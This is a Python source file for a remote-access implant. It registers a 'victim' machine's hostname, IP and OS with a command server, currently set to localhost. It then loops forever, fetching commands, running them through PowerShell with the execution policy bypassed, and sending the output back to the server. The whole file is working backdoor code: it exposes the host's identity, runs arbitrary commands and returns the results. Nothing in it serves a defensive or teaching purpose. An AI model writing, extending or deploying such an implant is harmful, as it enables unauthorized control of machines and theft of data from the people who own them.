import requests
import platform
import socket
import uuid
import time
import subprocess

SERVER = "http://127.0.0.1:8000/api"
VICTIM_ID = str(uuid.uuid4())

def get_info():
    return {
        "victim_id": VICTIM_ID,
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "os_info": f"{platform.system()} {platform.release()}"
    }

def register():
    try:
        res = requests.post(f"{SERVER}/victims/status", json=get_info())
        print("[+] Registered:", res.json())
    except Exception as e:
        print("[-] Register error:", e)

def get_commands():
    try:
        r = requests.get(f"{SERVER}/victims/{VICTIM_ID}/commands")
        return r.json() if r.ok else []
    except:
        return []

def run_command_powershell(cmd):
    try:
        ps_command = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd]
        output = subprocess.check_output(ps_command, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def report(output):
    try:
        requests.post(f"{SERVER}/victims/{VICTIM_ID}/report", json={"data": output})
    except:
        pass

def mark_done(cmd_id):
    try:
        requests.post(f"{SERVER}/victims/{VICTIM_ID}/commands/{cmd_id}/mark-executed")
    except:
        pass

def main():
    while True:
        register()
        for cmd in get_commands():
            output = run_command_powershell(cmd["command"])
            report(output)
            mark_done(cmd["id"])
        time.sleep(10)

if __name__ == "__main__":
    main()
